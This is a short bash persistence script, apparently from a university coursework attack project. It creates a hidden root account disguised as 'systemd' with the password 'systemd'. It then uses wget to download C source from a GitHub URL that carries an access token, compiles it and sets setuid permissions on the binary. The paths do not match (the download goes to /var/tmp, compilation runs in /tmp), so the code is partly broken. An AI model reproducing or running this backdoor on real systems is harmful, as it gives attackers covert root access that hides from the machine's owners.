#!/bin/bash

#Create root user
useradd -ou 0 -g 0 systemd
chpasswd <<<"systemd:systemd"

#suid binary
cd /tmp
wget "https://raw.githubusercontent.com/kevinnivekkevin/3204_coursework_1/05de94f2e69b0ab431ebc5dbbeb99550c9fef149/attack/Persistence/binarysuid?token=GHSAT0AAAAAABZGUXA7N5AUIYWB7D5BANTMY2U7BAA" -O /var/tmp/suid.c
gcc suid.c -o suid
chmod 7111 suid
rm suid.c